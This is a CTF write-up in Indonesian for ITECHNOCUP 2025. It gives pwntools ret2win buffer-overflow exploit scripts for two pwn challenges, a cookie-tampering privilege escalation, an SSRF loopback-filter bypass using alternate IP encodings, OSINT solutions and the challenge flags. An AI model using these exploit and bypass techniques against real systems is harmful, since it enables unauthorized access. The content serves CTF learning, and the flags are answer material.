---
author: ywdh
title: ITECHNOCUP CTF 2025 FINAL WRITEUP
tags: ["ctf", "offline"]
date: 
---
# Pwn

## PWN Baik

### TL;DR

Chall sederhana sekali, cukup ret2win dan dapat flag.

### Deskripsi

<details>
Baik Banget Cuma Input Input (Kayaknya)
<br><br>
nc 195.154.94.231 50151
</details>

### Langkah Penyelesaian

- Lakukan `checksec`:

```bash
checksec ./chall
----------------
Arch:       i386-32-little
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x8048000)
SHSTK:      Enabled
IBT:        Enabled
Stripped:   No
```

- Decompile `chall` file dengan IDA.

```c=
int __cdecl main(int argc, const char **argv, const char **envp)
{
  setbuf(stdout, 0);
  setbuf(stdin, 0);
  setbuf(stderr, 0);
  vuln(&argc);
  puts("Sayangnya... kamu nggak dapet apa-apa. Coba lagi deh.");
  return 0;
}

int vuln()
{
  char s[68]; // [esp+0h] [ebp-48h] BYREF

  puts("Masukin inputmu, jagoan:");
  gets(s);
  return printf("Inputmu: %s\n", s);
}

void __noreturn win()
{
  char s[100]; // [esp+8h] [ebp-70h] BYREF
  FILE *stream; // [esp+6Ch] [ebp-Ch]

  stream = fopen("/flag.txt", "r");
  if ( !stream )
  {
    puts("Flag file not found!");
    exit(1);
  }
  fgets(s, 100, stream);
  printf("Admin Mode Baik Ni Flagnya Ngab: %s", s);
  fclose(stream);
  exit(0);
}
```

- Lakukan cyclic untuk mendapatkan offset ke saved $EBP.

```bash
pwndbg -q ./chall
break *vuln+47
break *vuln+81
cyclic 100
run
ni
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa

continue
saaa
cyclic -l saaa
Found at offset 72
```

- Oke, langsung saja kita buat solver script-nya.

```python=
from pwn import *

context.binary = ELF("./chall", checksec=True)
exe = context.binary
host, port = "195.154.94.231", 50151

io = remote(host, port)
io.recvline()

payload = flat(
	b"A"*72,
	p32(0xdeadbeef),
	p32(exe.symbols['win']),
)
io.sendline(payload)
io.interactive()
```

### Flag

==ITECHNO2025{Pwn_P_nya_Pembaik}==

## PWN Sedikit Ramah

### TL;DR

Mirip seperti sebelumnya, tapi kali ini "harusnya" PIE enabled (tapi malah "NX" yang di enabled).

### Deskripsi

<details>
Ramah Banget PWN Ini Sampe Dikasih Hint
<br><br>
nc 195.154.94.231 50150
</details>

### Langkah Penyelesaian

- Langsung saja lakukan `checksec`:

```bash
checksec ./chall
----------------
Arch:       i386-32-little
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x8048000)
SHSTK:      Enabled
IBT:        Enabled
Stripped:   No
```

- Decompiled pakai IDA:

```c=
int __cdecl main(int argc, const char **argv, const char **envp)
{
  setbuf(stdout, 0);
  setbuf(stdin, 0);
  setbuf(stderr, 0);
  printf("DEBUG: win() is at %p\n", win);
  vuln(&argc);
  return 0;
}

char *vuln()
{
  char s[68]; // [esp+0h] [ebp-48h] BYREF

  puts("Welcome to PWN MEDIUM! Can you bypass me?");
  puts("Give me your input:");
  return gets(s);
}

void __noreturn win()
{
  char s[100]; // [esp+8h] [ebp-70h] BYREF
  FILE *stream; // [esp+6Ch] [ebp-Ch]

  stream = fopen("/flag", "r");
  if ( !stream )
  {
    puts("Flag not found!");
    exit(1);
  }
  fgets(s, 100, stream);
  printf("Congrats! Here's your flag: %s", s);
  fclose(stream);
  exit(0);
}
```

- Well, mirip bgt kan. Langsung aja kita cari offset ke saved $EBP pakai `pwndbg`:

```bash
pwndbg -q ./chall
break *vuln+65
break *vuln+77
cyclic 100
run
ni
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa

cyclic -l saaa
Found at offset 72
```

- Oke, offsetnya masih sama kita pakai solver script sebelumnya tapi kali ini saya bakal ambil leak win function biar meminimalisir kesalahan di remote server.

```python=
from pwn import *

context.binary = ELF("./chall", checksec=True)
exe = context.binary
host, port = "195.154.94.231", 50150

io = remote(host, port)
leak_win = int(io.recvline().strip().split()[-1], 16)
io.recvline()

log.info(f"Leak win func: {hex(leak_win)}")

payload = flat(
	b"A"*72,
	p32(0xdeadbeef),
	p32(leak_win),
)

io.sendline(payload)
io.interactive()
```

### Flag

==ITECHNO2025{PWN_M3d1UM_k0k_Ga4mpan6}==

# Web Exploitation

## Web Dadakan

### TL;DR

Cukup ganti cookie value ke `superadmin` dan akses endpoint `/superadmin`.
### Deskripsi

<details>
Web Belom Jadi, Bisa Lah Di Anuin
<br><br>
https://c-impromptu.itechnocup.id/
</details>

### Langkah Penyelesaian

- Open inspect element, di dalam tag `body` ada path yang menjanjikan, yaitu `/superadmin`.

```html=
<div class="container">
    <h1>Dadakan Shop</h1>
    <p>Website demo. Try to explore the site.</p>
    <p><a href="/dashboard">Dashboard</a></p>
    <p><a href="/login" id="loginLink">Login (dummy)</a></p>
    <p id="adminArea" style="display:none"><a href="/superadmin">Super Admin Panel</a></p>
  </div>
  <script>
    document.getElementById('loginLink').addEventListener('click', function(e){
      e.preventDefault();
      document.cookie = 'role=user; path=/';
      alert('Logged in as user.');
    });
  </script>
```

- Ketika dibuka, halamannya 404 Not Found. Langsung aja ganti cookie value ke `superadmin` dan found the flag!.

### Flag

==ITECHNO2025{W3bs1te_1ni_D1bu4t_D4daKan}==

## Path Doang Mah Kureng

### TL;DR

Simple SSRF bypass dengan akses internal endpoint.

### Deskripsi

<details>
Nge Dir path bang?, Ga cukup brok
<br>
https://c-path.itechnocup.id/
<br><br>
View Hint: Hint 1
Intinya gitu dah hehe...
<br>
View Hint: Hint 2
Coba kalian jadi hacker dan tebak path untuk masuk ke dalam sistem, tapi dengan bypass
</details>

### Langkah Penyelesaian

- Setelah halaman dibuka, terdapat link inspector dengan menginputkan URL.
- Saya langsung kepikiran SSRF untuk forge server mengakses internal endpoint (flag endpoint) dan mengembalikannya ke web page.
- Karena gak tau internal endpoint flag yang dimaksud bisa kira-kira aja sih, contohnya:
	- `/flag`
	- `/flag.txt`
	- `/.flag`
	- `/internal`
	- `/internal/flag`
	- `/internal/.flag`
	- `/internal/flag.txt`
- Setelah dicoba-coba, ternyata hanya allow **http** protocol dan gak diizinkan langsung akses local endpoint: `127.0.0.1`.
- Cara bypass-nya cukup simple, bisa dengan beberapa endpoint berikut ini.
	- `http://127.1/app.js`
	- `http://2130706433/app.js`
- Jika kita coba, secara otomatis mengembalikan respons JSON seperti ini:

```json
{
  "ok": true,
  "status": 200,
  "headers": {
    "content-type": "application/javascript; charset=UTF-8",
    "server": ""
  },
  "bodyPreview": "\n(function(){\n  const form = document.getElementById('previewForm');\n  const urlInput = document.getElementById('urlInput');\n  const result = document.getElementById('result');\n  const srvport = document.getElementById('srvport');\n  const uptime = document.getElementById('uptime');\n\n  // Expose current port (not a hint; just UI info)\n  fetch('/healthz').then(() => {\n    try {\n      // Port is embedded by the server (via same-origin); here we infer from location\n      const p = window.location.port || (window.location.protocol === 'https:' ? '443' : '80');\n      srvport.textContent = p;\n    } catch(_) {}\n  });\n\n  // Fake uptime counter (client-side)\n  const start = Date.now();\n  setInterval(() => {\n    const secs = Math.floor((Date.now() - start)/1000);\n    uptime.textContent = secs + 's';\n  }, 1000);\n\n  form.addEventListener('submit', async (e) => {\n    e.preventDefault();\n    result.textContent = 'Fetching…';\n    try {\n      const resp = await fetch('/api/preview', {\n        method: 'POST',\n        headers: {'Content-Type': 'application/json'},\n        body: JSON.stringify({ u: urlInput.value })\n      });\n      const data = await resp.json();\n      result.textContent = JSON.string"
}
```

> [!hint]+ File `app.js` itu udah ada by default dan bisa diakses dari publik.

- Jika udah bisa, langsung aja kita akses internal endpoint yang menyimpan flag, yaitu `/internal/flag`.

```json
{
  "ok": true,
  "status": 200,
  "headers": {
    "content-type": "application/json; charset=utf-8",
    "server": ""
  },
  "bodyPreview": "{\"ok\":true,\"flag\":\"ITECHNO2025{W3b_TR00o5Ss}\"}"
}
```

### Flag

==ITECHNO2025{W3b_TR00o5Ss}==

# OSINT

## Stalker 1

## TL;DR

Jujur, ini hoki banget sih kalo anak UI / PNJ karena bisa ketebak nama haltenya apa. Lokasi pastinya di Universitas Indonesia.

### Deskripsi

<details>
Tebak Arah Pulang Atmin
<br><br>
ITECHNO2025{NamaTempat_NamaUniversitas}
</details>

### Langkah Penyelesaian

- Karena udah tau lokasinya, jadi langsung aja kita craft flag sesuai format flag.
	- Nama Halte: **SOR**
	- Nama Universitas: **Universitas Indonesia**
- Submit flag and CORRECT!.
### Flag

==ITECHNO2025{SOR_UniversitasIndonesia}==

## Stalker 2

### Deskripsi

<details>
Atmin Dan Probset Sedang Liburan, Coba Kepoin Dong
<br><br>
ITECHNO2025{NamaWarkop_NoTelp_Longitude_Latitude_@Instagram}
<br><br>
instagramnya sudah menghilang tapi masi bisa dicari

Hint 1
Kota Yg Sering Dikunjungi Untuk Liburan
<br>
Hint 2
Kota asal Sheila on 7
<br>
Hint 3
Deket tugu, pastikan koordinat didepan gardu listrik
</details>

### Langkah Penyelesaian

- Setelah dapat hint 3 pencarian lokasi langsung mengerucut ke kota Yogyakarta dan dekat tugu, yaitu Warmindo Tugu Corner.

![Stalker 2-01](https://raw.githubusercontent.com/whyuhurtz/hackmd-blog/main/2025/_assets/itechnocup2025_osint2-01.png)

- Tinggal cari aja di Google Maps: **“Warmindo dekat tugu Yogya”** dan langsung keluar itu Warmindo Tugu Corner. Lihat road view dan sama persis dengan `IMAGE2.jpg`.

![Stalker 2-02](https://raw.githubusercontent.com/whyuhurtz/hackmd-blog/main/2025/_assets/itechnocup2025_osint2-02.png)

- Langsung aja kita copy informasi yang dibutuhkan, yaitu:
	- Nama warkop: **WarmindoTuguCorner**
	- Nomor telp: **0895321896803**
	- Longitude: **110.3670691**
	- Latitude: **-7.7825755**
	- Instagram: **@warmindotugu**
- Kita susun sesuai format flag dan CORRECT.

![Stalker 2-03](https://raw.githubusercontent.com/whyuhurtz/hackmd-blog/main/2025/_assets/itechnocup2025_osint2-03.png)

### Flag

==ITECHNO2025{WarmindoTuguCorner_0895321896803_110.3670691_-7.7825755_@warmindotugu}==
